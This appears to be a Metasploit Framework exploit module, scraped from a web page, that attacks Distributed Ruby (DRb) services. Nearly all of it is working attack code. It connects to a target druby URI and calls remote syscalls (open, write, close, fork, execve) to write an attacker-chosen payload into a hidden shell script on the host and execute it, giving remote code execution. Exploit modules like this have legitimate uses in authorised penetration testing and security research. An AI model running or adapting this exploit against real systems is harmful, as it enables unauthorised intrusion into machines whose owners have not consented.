print?
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
 
require &#039;msf/core&#039;
require &#039;drb/drb&#039;
class Metasploit3 < Msf::Exploit::Remote
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Distributed Ruby send syscall vulnerability.&#039;,
            &#039;Description&#039;    => %q{ This module exploits remote syscalls in DRuby
            },
            &#039;Author&#039;         => [ &#039;joernchen <joernchen@phenoelit.de> (Phenoelit)&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;&#039;,
            &#039;References&#039;     =>
                [
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                        },
                    &#039;Space&#039;       => 32768,
                },
            &#039;Platform&#039;       => &#039;linux&#039;,
            &#039;Arch&#039;           => ARCH_ALL,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DefaultTarget&#039; => 0))
 
             
            register_options(
                [
                    OptString.new(&#039;URI&#039;, [true, "The druby URI of the target host ", ""]),
                ], self.class)
    end
 
    def exploit
        serveruri = datastore[&#039;URI&#039;]
        DRb.start_service  
        p = DRbObject.new_with_uri(serveruri)
        class << p
            undef :send
        end
        filename = "." + Rex::Text.rand_text_alphanumeric(16)
        # syscall open
        i =  p.send(:syscall,8,filename,0700)
        #syscall write
        p.send(:syscall,4,i,"#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
        #syscall close
        p.send(:syscall,6,i)
        #syscall fork
        p.send(:syscall,2)
        #syscall execve
        p.send(:syscall,11,filename,0,0)
     
        handler(nil)
    end
end



